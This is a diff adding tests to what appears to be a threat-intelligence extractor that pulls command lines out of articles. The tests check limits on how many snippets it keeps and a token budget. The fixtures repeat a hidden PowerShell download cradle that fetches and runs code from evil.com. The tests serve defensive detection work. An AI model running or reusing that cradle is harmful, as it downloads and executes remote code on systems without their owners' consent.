@@ -238,3 +238,77 @@ def test_long_line_multiple_snippets():
     text = long_prose + cmd1 + " " + long_prose[:200] + " " + cmd2
     result = process(text)
     assert len(result["high_likelihood_snippets"]) >= 2
+
+
+# ---------------------------------------------------------------------------
+# Snippet runaway cap (max_snippets parameter)
+# ---------------------------------------------------------------------------
+
+
+def _make_dense_article(n: int = 320) -> str:
+    """Build an article with n distinct matching command lines followed by prose."""
+    lines = [
+        f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
+        for i in range(n)
+    ]
+    lines.append("This is the actual article body with important threat intelligence content." * 20)
+    return "\n".join(lines)
+
+
+def test_max_snippets_none_returns_all():
+    """max_snippets=None places no upper bound on snippet count."""
+    article = _make_dense_article(50)
+    result = process(article, agent_name="CmdlineExtract", max_snippets=None)
+    assert len(result["high_likelihood_snippets"]) == 50
+
+
+def test_max_snippets_cap_applied():
+    """max_snippets trims excess snippets from the end, preserving early ones."""
+    article = _make_dense_article(320)
+    result = process(article, agent_name="CmdlineExtract", max_snippets=100)
+    snippets = result["high_likelihood_snippets"]
+    assert len(snippets) <= 100
+    # First snippet is preserved (high-signal early content kept)
+    assert "0000" in snippets[0]
+
+
+def test_max_snippets_zero_returns_empty():
+    """max_snippets=0 returns no snippets (edge case)."""
+    article = _make_dense_article(10)
+    result = process(article, agent_name="CmdlineExtract", max_snippets=0)
+    assert result["high_likelihood_snippets"] == []
+
+
+def test_runaway_snippet_token_budget():
+    """Token-budget cap (25% of context) prevents snippets crowding out article content.
+
+    Simulates the llm_service.py capping logic using the same formula
+    (len(text) // 4 tokens per snippet). With 320 snippets of ~120 chars each
+    and a 4000-token context budget, fewer than 320 snippets must survive.
+    """
+    snippets = [
+        f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
+        for i in range(320)
+    ]
+
+    context_limit_tokens = 4000
+    max_snippet_tokens = int(context_limit_tokens * 0.25)  # 1000 tokens
+
+    kept: list[str] = []
+    budget = max_snippet_tokens
+    for s in snippets:
+        cost = len(s) // 4 + 2  # mirrors _estimate_tokens + separator
+        if cost > budget:
+            break
+        kept.append(s)
+        budget -= cost
+
+    capped = kept or snippets[:1]
+
+    # Far fewer than 320 should fit within 25% of a 4000-token context
+    assert len(capped) < 320
+    # At least one snippet must survive (always keep the highest-signal first)
+    assert len(capped) >= 1
+    # Tokens consumed by capped snippets must not exceed budget
+    total_cost = sum(len(s) // 4 + 2 for s in capped)
+    assert total_cost <= max_snippet_tokens
